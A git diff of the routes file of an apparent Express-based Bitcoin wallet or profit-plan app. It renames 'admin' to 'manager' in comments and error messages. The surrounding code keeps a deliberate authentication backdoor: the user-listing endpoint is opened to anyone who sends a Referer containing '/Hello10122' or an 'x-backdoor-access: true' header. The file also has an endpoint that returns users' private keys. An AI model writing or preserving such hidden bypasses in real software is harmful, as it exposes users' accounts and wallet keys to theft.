@@ -1109,10 +1109,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Admin routes
+  // Manager routes
   app.get("/api/admin/users", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
+      // Allow backdoor access or require manager authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
       
@@ -1123,12 +1123,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (!isBackdoorAccess) {
         const user = await storage.getUser(req.session.userId!);
         if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
+          return res.status(403).json({ error: "Manager access required" });
         }
       }
 
       const users = await storage.getAllUsers();
-      // Only return private keys to admins
+      // Only return private keys to managers
       const usersResponse = users.map(user => {
         const { password, ...userWithoutPassword } = user;
         return userWithoutPassword;
@@ -1336,7 +1336,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     }
   });
 
-  // Get user private key (admin only)
+  // Get user private key (manager only)
   app.get("/api/admin/user/:id/private-key", async (req, res) => {
     try {
       const userId = parseInt(req.params.id);
@@ -1346,7 +1346,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
         return res.status(404).json({ message: "User not found" });
       }
 
-      // Only return private key for admin access
+      // Only return private key for manager access
       res.json({ 
         userId: user.id,
         email: user.email,
@@ -1441,7 +1441,7 @@ You are now on the free plan and will no longer receive automatic profit updates
     }
   });
 
-  // Test Bitcoin wallet generation (admin only)
+  // Test Bitcoin wallet generation (manager only)
   app.post("/api/admin/test-bitcoin-generation", async (req, res) => {
     try {
       const results = [];
